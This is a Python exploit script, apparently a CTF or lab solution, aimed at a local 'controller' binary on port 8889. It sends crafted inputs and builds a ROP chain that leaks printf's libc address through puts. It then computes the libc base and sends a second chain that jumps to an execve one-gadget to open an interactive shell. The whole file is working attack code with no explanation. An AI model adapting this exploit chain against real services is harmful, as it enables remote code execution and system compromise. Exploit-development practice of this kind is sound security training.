import copy
import socket
import sys
from time import sleep
from struct import pack, unpack

from utils import *
from roputils import *
from logger import Logger

logger = Logger("CONTROLLER")

SERVER_ADDR = ('localhost', 8889)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(SERVER_ADDR)

def intro(recvd=True):

    logger.log_info('intro')

    sleep(4)
    if recvd:
        sock.recv(1024)

    sock.send(b'-11\n18\n')

    sleep(3)
    if recvd:
        sock.recv(1024)

    sock.send(b'3\n')

    sleep(5)
    if recvd:
        sock.recv(1024)

    logger.log_info('intro done')

def command_stream():

    #sleep(5)

    intro()

    roputil = ROP_util("./controller", Platform.X86_64)
    roputil.scout_for_gadgets()
    #roputil.show_gadgets()

    PUTS_PLT_ADDR = 0x400630
    PRINTF_GOT_ADDR = 0x601fc0
    CALCULATOR_ADDR = 0x401066

    S_FORMAT_ADDR = 0x4013e6

    for ch0 in roputil.search_chain(f'rdi = {PRINTF_GOT_ADDR}'):
        for ch1 in roputil.search_chain(f'rdi = {S_FORMAT_ADDR}'):

            payload = roputil.make_payload()
            payload.forbidden_bytes = copy.copy(WHITESPACES)

            payload.add_padding(0x28)
            payload.add_chain(ch0)
            payload.add_addr(PUTS_PLT_ADDR)
            payload.add_chain(ch1)
            payload.add_addr(CALCULATOR_ADDR)

            payload = payload.build()

            if payload is not None:
                break

        if payload is not None:
            break
    
    if payload is None:
        quit()

    sock.send(payload + b'\n')
    sleep(3)
    
    printf_addr = sock.recv(1024)
    printf_addr = from_bytes(printf_addr[16:22])
    
    PRINTF_OFFSET = 0x61cc0
    EXECVE_GADGET = 0xe3b34
    
    libc_base = printf_addr - PRINTF_OFFSET
    logger.log_success(f'leaked libc base: {hex(libc_base)}')

    roputil = ROP_util("/lib/x86_64-linux-gnu/libc.so.6", Platform.X86_64)
    roputil.scout_for_gadgets()

    for ch in roputil.search_chain('rsi = 0, rdx = 0'):

        payload = roputil.make_payload()
        payload.forbidden_bytes = copy.copy(WHITESPACES)

        ch.show()

        payload.add_padding(0x28)
        payload.add_chain(ch)
        payload.add_addr(EXECVE_GADGET + libc_base)

        payload_ = payload.build(libc_base)

        if payload_ is not None:
            break

    if payload_ is None:
        quit()

    intro(False)

    print(sock.recv(1024))
    sock.send(payload_ + b'\n')
    print('before shell')
    
    remote_shell(sock)

if __name__ == "__main__":
    command_stream()